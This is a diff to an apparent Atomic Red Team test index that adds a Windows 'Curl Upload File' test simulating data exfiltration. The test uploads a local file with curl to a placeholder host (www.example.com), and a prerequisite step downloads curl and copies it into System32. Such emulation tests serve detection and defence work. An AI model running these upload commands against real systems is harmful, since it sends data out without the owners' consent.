@@ -68482,6 +68482,56 @@ command-and-control:
           del c:\programdata\allthethingsx64.dll >nul 2>&1
           del %Temp%\allthethingsx64.dll >nul 2>&1
         name: command_prompt
+    - name: Curl Upload File
+      auto_generated_guid: 635c9a38-6cbf-47dc-8615-3810bc1167cf
+      description: |
+        The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration
+        Expected output will include whether the file uploaded successfully or not.
+      supported_platforms:
+      - windows
+      input_arguments:
+        curl_path:
+          description: path to curl.exe
+          type: Path
+          default: C:\Windows\System32\Curl.exe
+        remote_destination:
+          description: Remote destination
+          type: String
+          default: www.example.com
+        file_path:
+          description: File to upload
+          type: String
+          default: c:\temp\atomictestfile.txt
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Curl must be installed on system.
+
+'
+        prereq_command: 'if (Test-Path #{curl_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest “https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip” -Outfile $env:temp\curl.zip
+          Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
+          Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
+          Remove-Item $env:temp\curl
+          Remove-Item $env:temp\curl.zip
+      - description: 'A file must be created to upload
+
+'
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'echo "This is an Atomic Test File" > #{file_path}
+
+'
+      executor:
+        command: |
+          #{curl_path} -T #{file_path} #{remote_destination}
+          #{curl_path} --upload-file #{file_path} #{remote_destination}
+          #{curl_path} -d #{file_path} #{remote_destination}
+          #{curl_path} --data #{file_path} #{remote_destination}
+        name: command_prompt
   T1090.001:
     technique:
       external_references:
